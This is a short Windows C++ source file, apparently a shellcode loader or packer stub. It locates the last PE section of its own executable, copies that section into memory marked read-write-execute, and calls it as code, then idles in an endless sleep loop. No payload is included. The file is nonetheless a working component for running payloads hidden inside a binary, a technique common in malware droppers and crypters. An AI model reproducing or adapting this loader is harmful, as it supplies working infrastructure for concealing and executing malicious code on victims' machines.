#include <windows.h>


int main(int argc, char const *argv[])
{	

    IMAGE_DOS_HEADER* DOSHeader; // For Nt DOS Header symbols
    IMAGE_NT_HEADERS* NtHeader; // For Nt PE Header objects & symbols
    IMAGE_SECTION_HEADER* LastSectionHeader;


    HMODULE moduleHandle = GetModuleHandle(NULL);
    if(moduleHandle == NULL){
        return 1;
    }

    DOSHeader = PIMAGE_DOS_HEADER(moduleHandle); // Initialize Variable
    NtHeader = PIMAGE_NT_HEADERS(DWORD(moduleHandle) + DOSHeader->e_lfanew); // Initialize
    LastSectionHeader = PIMAGE_SECTION_HEADER(DWORD(moduleHandle) + DOSHeader->e_lfanew + 248 + ((NtHeader->FileHeader.NumberOfSections-1) * 40));
    DWORD LastSectionSize = LastSectionHeader->SizeOfRawData;
    DWORD LastSectionAddress = DWORD(LastSectionHeader->VirtualAddress)+DWORD(moduleHandle);

	unsigned char* BUFFER = (unsigned char*)VirtualAlloc(NULL, LastSectionSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy((void*)BUFFER,(void*)LastSectionAddress,(size_t)LastSectionHeader->SizeOfRawData);	
    (*(void(*)())BUFFER)();
	
	while(true){
		Sleep(1000);
	}
	return 0;
}


